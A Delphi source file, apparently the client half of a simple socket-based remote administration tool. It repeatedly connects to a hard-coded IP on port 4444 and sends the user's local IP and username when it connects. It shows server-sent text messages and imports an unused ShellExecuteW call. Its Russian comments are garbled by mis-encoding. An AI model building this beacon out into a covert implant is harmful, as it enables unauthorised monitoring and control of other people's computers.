unit TCPClient;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms,  System.Win.ScktComp,Vcl.Dialogs;




type
  TForm2 = class(TForm)
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

type
  TOThread = class(TThread)
  private
  protected
    procedure Execute; override;
  public
    Client: TClientSocket;
    constructor Create;
    destructor Destroy; override;
    procedure OnRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure OnError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure OnConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure OnDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure UpdateConnectionSynch;
  end;

const
shell = 'shell32.dll';
kernel  = 'kernel32.dll';

function ShellExecuteW(hWnd: THandle; Operation, FileName, Parameters,
Directory: WideString; ShowCmd: Integer): HINST; stdcall;
external shell name 'ShellExecuteW';

function ExpandEnvironmentStrings(lpSrc: LPCWSTR; lpDst: LPWSTR; nSize: DWORD): DWORD; stdcall;
external kernel name 'ExpandEnvironmentStringsW';


var
  Form2: TForm2;
  OThread: TOThread;
  Ip, Port: AnsiString;


implementation

{$R *.dfm}


constructor TOThread.Create;
begin
  inherited Create(false);
  self.FreeOnTerminate:=true;
  self.Priority:=tpNormal;
end;

destructor TOThread.Destroy;
begin
   inherited  Destroy;
   Client.Socket.Close;
   Self.Terminate;
end;

procedure SleepTime(t: Integer);
var
  intw: Integer;
begin
  intw := 0;
  while intw < t do
  begin
    inc(intw);
    Sleep(1);
    Application.ProcessMessages;
  end;
end;

procedure TOThread.UpdateConnectionSynch;
begin
  if Client.Active = True then Form2.Caption := '[+] Connection established ' +
  Client.Socket.RemoteAddress + ':' + IntToStr(Client.Socket.RemotePort)
  else Form2.Caption := '[-] No connection.';
end;

procedure TOThread.Execute;
begin
  Ip := AnsiString('55.125.32.178');
  Port := AnsiString('4444');
  Client := TClientSocket.Create(nil);
  Client.OnRead := OnRead;
  Client.OnError := OnError;
  Client.OnConnect := OnConnect;
  Client.OnDisconnect := OnDisconnect;
  //запускаем бесконечный цикл
  while not Self.Terminated do
  begin
      try
        //если сервер отключЄн то мы пробуем подключитьс€ к нему
        if Client.Socket.Connected = False then
        begin
          Client.Address := string(Ip);
          Client.port := StrToInt(string(Port));
          Client.Active := True;
        end;
      finally
        Application.ProcessMessages;
      end;

    //ќжидаем интервал 5 секунд
    SleepTime(5000);
    //если соединени€ нет то закрываем сокет
    if Client.Socket.Connected = False then
      Client.Socket.Close;
  end;
end;


procedure TOThread.OnRead(Sender: TObject; Socket: TCustomWinSocket);
var
TEXT, CommandServer: Ansistring;
begin
    CommandServer := Socket.ReceiveText;
    //¬ыводим сообщение что выслал нам сервер
  if Copy(CommandServer, 0, Pos('#', string(CommandServer)) - 1) = 'TEXT' then
  begin
    Delete(CommandServer, 1, Pos('#', string(CommandServer)));
    TEXT := AnsiString(Copy(string(CommandServer), 0, Pos('#', string(CommandServer)) - 1));
    Delete(CommandServer, 1, Pos('#', string(CommandServer)));
    ShowMessage(string(TEXT));
  end;
end;

procedure TOThread.OnError(Sender: TObject; Socket: TCustomWinSocket; ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
end;

procedure TOThread.OnConnect(Sender: TObject; Socket: TCustomWinSocket);
var
UN: AnsiString;
begin
//обновл€ем заголовок нашей формы
Synchronize(UpdateConnectionSynch);
//ѕри подключении к серверу высылаем серверу наш локальный IP адрес и им€ пользовател€
try
  //им€ пользовател€
  UN := AnsiString(GetEnvironmentVariable('username'));
  Socket.SendText('INFO#' + AnsiString(Socket.LocalAddress) +'#'+AnsiString(UN)+'#');
finally
 Application.ProcessMessages;
end;
end;


procedure TOThread.OnDisconnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  //обновл€ем заголовок нашей формы
  Synchronize(UpdateConnectionSynch);
end;


procedure TForm2.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  //ѕри закрытии формы разрушаем поток
  if  OThread <>  nil  then
  begin
    OThread.Client.Active := False;
    FreeAndNil(OThread.Client);
    OThread.Terminate ;
    OThread  :=  nil;
  end
end;

procedure TForm2.FormCreate(Sender: TObject);
begin
//—оздаЄм поток
   OThread := TOThread.Create;
end;

end.
